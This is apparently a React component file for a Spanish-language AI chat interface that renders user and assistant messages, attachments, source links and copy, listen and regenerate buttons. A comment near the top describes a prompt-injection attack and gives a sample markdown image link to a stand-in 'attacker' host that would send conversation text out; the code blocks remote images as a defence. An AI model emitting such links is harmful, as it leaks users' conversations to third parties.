"use client";

import type { FileUIPart, SourceUrlUIPart, UIMessage } from "ai";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { fileBadge } from "./attachments";
import { CodeBlock } from "./CodeBlock";
import { CopyButton } from "./CopyButton";
import { highlight } from "./highlight";
import { isToolPart, ToolChip } from "./ToolChip";

/**
 * Remote images are not rendered: a prompt-injected answer could otherwise load `![](https://attacker/?d=…)` and leak
 * conversation text just by being displayed. The alt text stays so nothing is silently lost.
 */
const markdown: Components = {
  pre: CodeBlock,
  img: ({ alt }) => (alt ? <span className="italic text-muted">[imagen: {alt}]</span> : null),
};

export function FileChip({ name, mediaType, meta, onRemove }: { name: string; mediaType: string; meta?: string; onRemove?: () => void }) {
  return (
    <span className="flex h-11 max-w-60 items-center gap-2.5 rounded-2xl border border-line bg-surface py-1 pl-1.5 pr-3 text-left">
      <span className="grid h-8 min-w-8 shrink-0 place-items-center rounded-xl bg-ink px-1.5 font-mono text-[10px] font-bold tracking-wide text-paper">
        {fileBadge(name, mediaType)}
      </span>
      <span className="min-w-0 leading-tight">
        <span className="block truncate text-sm">{name}</span>
        {meta && <span className="block text-xs text-muted">{meta}</span>}
      </span>
      {onRemove && (
        <button
          type="button"
          onClick={onRemove}
          aria-label={`Quitar ${name}`}
          className="-mr-1.5 ml-0.5 grid size-7 shrink-0 cursor-pointer place-items-center rounded-full text-muted transition-colors duration-150 hover:bg-ink/10 hover:text-ink"
        >
          <svg width="12" height="12" viewBox="0 0 12 12" aria-hidden="true">
            <path d="M3 3l6 6M9 3l-6 6" stroke="currentColor" strokeWidth="1.6" strokeLinecap="round" />
          </svg>
        </button>
      )}
    </span>
  );
}

function Attachments({ files }: { files: FileUIPart[] }) {
  if (!files.length) return null;
  return (
    <div className="ml-auto flex max-w-[85%] flex-wrap justify-end gap-2">
      {files.map((f, i) =>
        f.mediaType.startsWith("image/") ? (
          // eslint-disable-next-line @next/next/no-img-element -- data URLs from the user's own upload
          <img
            key={i}
            src={f.url}
            alt={f.filename ?? "Imagen adjunta"}
            className="max-h-52 max-w-60 rounded-2xl border border-line object-cover"
          />
        ) : (
          <FileChip key={i} name={f.filename ?? "archivo"} mediaType={f.mediaType} />
        ),
      )}
    </div>
  );
}

function Sources({ sources }: { sources: SourceUrlUIPart[] }) {
  const unique = sources.filter((s, i) => sources.findIndex((o) => o.url === s.url) === i);
  if (!unique.length) return null;
  const host = (url: string) => {
    try {
      return new URL(url).hostname.replace(/^www\./, "");
    } catch {
      return url;
    }
  };
  return (
    <div className="mt-3 flex flex-wrap items-center gap-1.5 text-xs">
      <span className="text-muted">Fuentes:</span>
      {unique.slice(0, 6).map((s) => (
        <a
          key={s.url}
          href={s.url}
          target="_blank"
          rel="noopener noreferrer"
          title={s.title ?? s.url}
          className="max-w-48 truncate rounded-full border border-line px-2.5 py-1 text-muted transition-colors duration-150 hover:border-ink hover:text-ink"
        >
          {s.title && s.title.length < 40 ? s.title : host(s.url)}
        </a>
      ))}
    </div>
  );
}

export function Message({
  message,
  streaming = false,
  onRegenerate,
  onListen,
  speaking = false,
}: {
  message: UIMessage;
  streaming?: boolean;
  /** Only the latest answer can be regenerated; omit it for the rest. */
  onRegenerate?: () => void;
  /** Read this answer aloud (or stop doing so); absent where the browser cannot speak. */
  onListen?: () => void;
  speaking?: boolean;
}) {
  const text = message.parts.map((p) => (p.type === "text" ? p.text : "")).join("");
  const files = message.parts.filter((p): p is FileUIPart => p.type === "file");

  if (message.role === "user") {
    if (!text && !files.length) return null;
    return (
      <div className="rise flex flex-col gap-2">
        <Attachments files={files} />
        {text && (
          <div className="ml-auto max-w-[85%] whitespace-pre-wrap break-words rounded-3xl rounded-br-lg bg-ink px-4 py-2.5 text-paper">
            {text}
          </div>
        )}
      </div>
    );
  }

  const tools = message.parts.filter(isToolPart);
  if (!text && !tools.length) return null;
  const sources = message.parts.filter((p): p is SourceUrlUIPart => p.type === "source-url");
  return (
    <div className="msg rise w-fit max-w-full rounded-3xl rounded-tl-lg bg-paper/80 px-4 pb-1.5 pt-3 backdrop-blur-md">
      {tools.map((p) => (
        <ToolChip key={p.toolCallId} part={p} />
      ))}
      <div className="md">
        <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[highlight]} components={markdown}>
          {text}
        </ReactMarkdown>
      </div>
      <Sources sources={sources} />
      {/* Always laid out (just hidden while streaming) so the list doesn't jump when the answer ends. */}
      <div className={`msg-actions -ml-2.5 mt-1 ${streaming ? "invisible" : ""}`}>
        <CopyButton text={text} label="Copiar respuesta" className="text-muted hover:bg-ink/5 hover:text-ink" />
        {onListen && (
          <button
            type="button"
            onClick={onListen}
            aria-label={speaking ? "Detener la lectura" : "Escuchar la respuesta"}
            aria-pressed={speaking}
            title={speaking ? "Detener la lectura" : "Escuchar la respuesta"}
            className="inline-flex h-8 cursor-pointer items-center gap-1.5 rounded-full px-2.5 text-xs font-medium text-muted transition-[transform,color,background-color] duration-150 ease-out hover:bg-ink/5 hover:text-ink active:scale-[0.97] aria-pressed:text-ink"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
              {speaking ? <rect x="6" y="6" width="12" height="12" rx="2" /> : <path d="M11 5L6 9H3v6h3l5 4V5zM15.5 8.5a5 5 0 010 7M18.5 5.5a9 9 0 010 13" />}
            </svg>
            {speaking ? "Detener" : "Escuchar"}
          </button>
        )}
        {onRegenerate && (
          <button
            type="button"
            onClick={onRegenerate}
            aria-label="Generar otra respuesta"
            title="Generar otra respuesta"
            className="inline-flex h-8 cursor-pointer items-center gap-1.5 rounded-full px-2.5 text-xs font-medium text-muted transition-[transform,color,background-color] duration-150 ease-out hover:bg-ink/5 hover:text-ink active:scale-[0.97]"
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
              <path d="M21 12a9 9 0 1 1-3-6.7L21 8M21 3v5h-5" />
            </svg>
            Otra respuesta
          </button>
        )}
      </div>
    </div>
  );
}
